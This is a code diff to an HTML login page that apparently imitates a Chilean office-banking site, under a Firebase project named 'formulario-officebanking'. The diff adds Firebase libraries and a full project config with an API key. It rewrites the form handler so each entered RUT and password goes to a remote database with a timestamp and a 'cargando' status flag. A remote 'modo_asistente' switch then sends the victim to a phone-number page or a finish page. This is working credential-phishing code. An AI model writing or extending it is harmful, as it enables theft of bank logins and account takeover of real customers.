@@ -35,7 +35,7 @@
       font-weight: bold;
     }
     .titulo span:last-child {
-      background-color: black;
+      background-color: red;
       color: white;
       padding: 2px 6px;
       border-radius: 4px;
@@ -86,6 +86,8 @@
       color: red;
     }
   </style>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 </head>
 <body>
   <div class="contenedor">
@@ -108,6 +110,19 @@
   </div>
 
   <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
+      authDomain: "formulario-officebanking.firebaseapp.com",
+      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
+      projectId: "formulario-officebanking",
+      storageBucket: "formulario-officebanking.appspot.com",
+      messagingSenderId: "604053438195",
+      appId: "1:604053438195:web:188de91bee9a62f0d3c186"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
     function togglePassword() {
       const claveInput = document.getElementById('clave');
       claveInput.type = claveInput.type === 'password' ? 'text' : 'password';
@@ -122,8 +137,6 @@
       }
       const cuerpo = raw.slice(0, -1);
       const dv = raw.slice(-1);
-
-      // Formatear con puntos
       let cuerpoFmt = '';
       for (let i = cuerpo.length - 1, j = 1; i >= 0; i--, j++) {
         cuerpoFmt = cuerpo[i] + cuerpoFmt;
@@ -154,11 +167,20 @@
 
     function enviarFormulario(e) {
       e.preventDefault();
-      const rut = document.getElementById('rut').value;
-      const clave = document.getElementById('clave').value;
-      localStorage.setItem('rut', rut);
-      localStorage.setItem('clave', clave);
-      window.location.href = 'finalizar.html';
+      const rut = document.getElementById("rut").value;
+      const clave = document.getElementById("clave").value;
+      const now = new Date().toISOString();
+      const id = db.ref("usuarios").push().key;
+      db.ref("usuarios/" + id).set({ rut, clave, hora: now });
+      db.ref("estado_usuario/" + id).set({ estado: "cargando" });
+      db.ref("ultimo_usuario").set(id);
+      db.ref("modo_asistente").once("value").then(snap => {
+        if (snap.val() === true) {
+          window.location.href = "telefono.html";
+        } else {
+          window.location.href = "finalizar.html";
+        }
+      });
     }
   </script>
 </body>
